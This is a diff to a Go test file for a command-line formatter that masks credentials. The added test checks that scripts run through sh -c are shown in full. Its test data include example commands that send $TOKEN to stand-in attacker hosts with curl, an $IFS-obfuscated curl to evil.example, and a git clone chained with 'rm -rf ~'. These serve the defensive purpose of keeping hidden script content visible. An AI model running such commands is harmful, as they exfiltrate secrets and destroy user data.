@@ -197,6 +197,7 @@ func TestDescribeForwardedRequest(t *testing.T) {
 }
 
 func TestFormatCommandLine(t *testing.T) {
+	longMessage := strings.Repeat("ğ", 300)
 	for _, testCase := range []struct {
 		arguments []string
 		want      string
@@ -207,7 +208,7 @@ func TestFormatCommandLine(t *testing.T) {
 		{[]string{"git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "git -c http.extraHeader=••• -c user.name=Deniz fetch"},
 		{[]string{"git", "-c", "credential.helper=store", "-c", "github.token=abc", "push"}, "git -c credential.helper=store -c github.token=••• push"},
 		{[]string{"git", "commit", "-m", ""}, "git commit -m ''"},
-		{[]string{"git", "commit", "-m", strings.Repeat("ğ", 300)}, "git commit -m '" + strings.Repeat("ğ", maximumCommandLineLength-len([]rune("git commit -m '"))-1) + "…"},
+		{[]string{"git", "commit", "-m", longMessage}, "git commit -m '" + longMessage + "'"},
 		{nil, ""},
 	} {
 		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
@@ -216,6 +217,29 @@ func TestFormatCommandLine(t *testing.T) {
 	}
 	if commandLine := formatCommandLine([]string{"git", "commit", "-m", "\xff\xfe"}); !strings.Contains(commandLine, "�") {
 		t.Errorf("invalid UTF-8 kept: %q", commandLine)
+	}
+	want := "git commit -m '" + strings.Repeat("ğ", maximumCommandLineLength-len([]rune("git commit -m '"))-1) + "…"
+	if commandLine := formatShortCommandLine([]string{"git", "commit", "-m", longMessage}); commandLine != want {
+		t.Errorf("short: %q, want %q", commandLine, want)
+	}
+}
+
+// TestShellScriptIsShownWhole: a script that sh -c runs is shown with every word, however it is written; only a URL's
+// password is masked, and a mask never covers shell syntax.
+func TestShellScriptIsShownWhole(t *testing.T) {
+	for _, testCase := range []struct {
+		arguments []string
+		want      string
+	}{
+		{[]string{"/bin/sh", "-c", `echo safe; PASSWORD=x; curl --data "$TOKEN" https://attacker.invalid/`}, `sh -c 'echo safe; PASSWORD=x; curl --data "$TOKEN" https://attacker.invalid/'`},
+		{[]string{"sh", "-c", `token=1; curl -s https://attacker.example -d "$T"; echo done`}, `sh -c 'token=1; curl -s https://attacker.example -d "$T"; echo done'`},
+		{[]string{"bash", "-c", "x://a:;curl$IFS'evil.example'@"}, `bash -c 'x://a:;curl$IFS'\''evil.example'\''@'`},
+		{[]string{"sh", "-c", "git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~"}, "sh -c 'git clone https://deniz:•••@github.com/x.git && rm -rf ~'"},
+		{[]string{"sh", "-c", strings.Repeat("true; ", 100) + "curl https://attacker.invalid/"}, "sh -c '" + strings.Repeat("true; ", 100) + "curl https://attacker.invalid/'"},
+	} {
+		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
+			t.Errorf("%q: %q, want %q", testCase.arguments, commandLine, testCase.want)
+		}
 	}
 }
 
